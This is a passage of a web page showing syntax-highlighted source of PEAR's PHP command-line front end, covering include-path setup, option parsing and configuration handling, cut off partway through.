class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * PEAR, the PHP Extension and Application Repository</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Command line interface</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PHP versions 4 and 5</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@category</span>  pear</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@package</span>   PEAR</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Stig Bakken &lt;ssb<span class="hljs-doctag">@php</span>.net&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Tomas V.V.Cox &lt;cox<span class="hljs-doctag">@idecnet</span>.com&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@copyright</span> 1997-2009 The Authors</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@license</span>   http://opensource.org/licenses/bsd-license.php New BSD License</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@link</span>      http://pear.php.net/package/PEAR</span><br><span class="hljs-comment"> */</span><br><br>@<span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>)) &#123;<br>    <span class="hljs-comment">// this is defined in peclcmd.php as &#x27;pecl&#x27;</span><br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_IGNORE_BACKTRACE&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@nodep</span> Gtk</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//the space is needed for windows include paths with trailing backslash</span><br><span class="hljs-comment">// http://pear.php.net/bugs/bug.php?id=19482</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span> != <span class="hljs-string">&#x27;@&#x27;</span>.<span class="hljs-string">&#x27;include_path&#x27;</span>.<span class="hljs-string">&#x27;@ &#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span>). PATH_SEPARATOR .  <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">false</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__DIR__</span>) . PATH_SEPARATOR . <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">true</span>;<br>&#125;<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;allow_url_fopen&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ob_implicit_flush</span>(<span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;track_errors&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;html_errors&#x27;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-string">&#x27;#$%^&amp;*&#x27;</span>;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;error_handler&#x27;</span>);<br><br><span class="hljs-variable">$pear_package_version</span> = <span class="hljs-string">&quot;1.10.12&quot;</span>;<br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Frontend.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Config.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Command.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Console/Getopt.php&#x27;</span>;<br><br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-comment">// remove this next part when we stop supporting that crap-ass PHP 4.2</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$HTTP_SERVER_VARS</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .<br>         <span class="hljs-string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br><span class="hljs-variable">$progname</span> = PEAR_RUNTYPE;<br><span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$argv</span>);<br><span class="hljs-variable">$options</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$argv</span>, <span class="hljs-string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);<br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$options</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-variable">$options</span>);<br>&#125;<br><br><span class="hljs-variable">$opts</span> = <span class="hljs-variable">$options</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;CLI&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;gpear&#x27;</span> || <span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;pear-gtk&#x27;</span>) &#123;<br>    <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>) &#123;<br>            <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pear_user_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$pear_system_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$verbose</span> = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>        <span class="hljs-variable">$pear_user_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-variable">$pear_system_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-variable">$fetype</span>);<br><span class="hljs-variable">$ui</span> = &amp;<span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getFrontendObject</span>();<br><span class="hljs-variable">$config</span> = &amp;<span class="hljs-title class_">PEAR_Config</span>::<span class="hljs-title function_ invoke__">singleton</span>(<span class="hljs-variable">$pear_user_config</span>, <span class="hljs-variable">$pear_system_config</span>);<br><br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$config</span>)) &#123;<br>    <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_user_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-variable">$pear_user_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_system_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$pear_system_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_file</span> == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>        <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;The default config file&#x27;</span>;<br>    &#125;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">outputData</span>(<span class="hljs-string">&quot;ERROR: <span class="hljs-subst">$_file</span> is not a valid config file or is corrupted.&quot;</span>);<br>    <span class="hljs-comment">// We stop, we have no idea where we are :)</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// this is used in the error handler to retrieve a relative path</span><br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>);<br><span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">setConfig</span>(<span class="hljs-variable">$config</span>);<br>PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>));<br><br><span class="hljs-variable">$verbose</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;verbose&quot;</span>);<br><span class="hljs-variable">$cmdopts</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$raw</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;user&#x27;</span>) &amp;&amp; !<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;system&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$found</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;d&#x27;</span> || <span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;D&#x27;</span>) &#123;<br>                <span class="hljs-comment">// the user knows what they are doing, and are setting config values</span><br>                <span class="hljs-variable">$found</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$found</span>) &#123;<br>            <span class="hljs-comment">// no prior runs, try to install PEAR</span><br>            <span class="hljs-variable">$parent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$parent</span>, <span class="hljs-string">&#x27;scripts&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$grandparent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$parent</span>);<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$grandparent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$grandparent</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$parent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$parent</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$packagexml</span>)) &#123;<br>                <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>] = <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;install&#x27;</span>,<br>                    <span class="hljs-variable">$packagexml</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;php&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;data_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;data&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;doc_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;docs&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;test_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;tests&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<br>                    <span class="hljs-string">&#x27;ext_dir&#x27;</span>,<br>                    <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;extensions&#x27;</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;bin_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">mergeConfigFile</span>(<span class="hljs-variable">$pearbase</span> . <span class="hljs-string">&#x27;pear.ini&#x27;</span>, <span class="hljs-literal">false</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>();<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;auto_discover&#x27;</span>, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-variable">$param</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>] : <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected -d config_value=value, &#x27;</span> .<br>                <span class="hljs-string">&#x27;received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;system&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>        <span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>        <span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$param</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-literal">null</span>, <span 